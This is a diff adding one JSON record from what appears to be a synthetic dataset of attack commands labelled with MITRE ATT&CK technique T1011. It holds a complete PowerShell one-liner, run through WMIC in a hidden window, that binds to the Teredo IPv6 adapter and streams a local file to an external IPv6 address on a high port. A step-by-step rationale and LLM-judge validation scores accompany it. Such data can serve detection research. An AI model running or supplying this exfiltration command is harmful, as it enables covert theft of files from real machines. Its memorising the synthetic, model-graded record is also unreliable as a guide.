@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Teredo*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8::50'); `$c.Connect(`$rv6,53456); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Diagnostics\\etl.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Starts a hidden PowerShell via WMIC that binds an IPv6 TCP client to the Teredo tunneling interface and exfiltrates a file to an IPv6 address on a high port. This uses an IPv6 tunnel as an alternate medium in line with T1011.",
+  "rationale_steps": [
+    "Query for the Teredo tunneling adapter and obtain its IPv6 address.",
+    "Create an IPv6 TCP client and bind it to the Teredo-local address.",
+    "Connect to an IPv6 external host on an uncommon port.",
+    "Stream file data through the Teredo path, separate from primary IPv4 LAN.",
+    "Limit scope to the process, avoiding global network changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-e336a109",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Balanced quoting and parentheses with valid WMIC/PowerShell usage, though the backtick-escaped variables are unnecessary and could introduce minor parsing quirks.",
+        "semantic_score": 3,
+        "semantic_justification": "It attempts to exfiltrate a file via an IPv6 TCP connection bound to a Teredo interface (operationally plausible), but this reflects alternate protocol/tunneling rather than MITRE T1011’s different network medium (e.g., cellular/Bluetooth) and targets a non-routable documentation IPv6 address.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:29:20.846120Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax with appropriate backtick escaping, and valid WMIC process call create invocation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by identifying a Teredo tunneling interface (alternative network medium), binding to it specifically, and exfiltrating a file over IPv6 to bypass potential IPv4 monitoring, exactly matching the technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:29:23.970677Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct WMIC syntax and appropriate backtick escaping for PowerShell variables within the nested command string, ensuring proper parsing and execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements exfiltration by identifying a Teredo IPv6 interface, binding an IPv6 TCP client to it, and sending file data to a remote IPv6 address, which directly aligns with T1011's concept of using an 'Exfiltration Over Other Network Medium'.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:32:22.619798Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
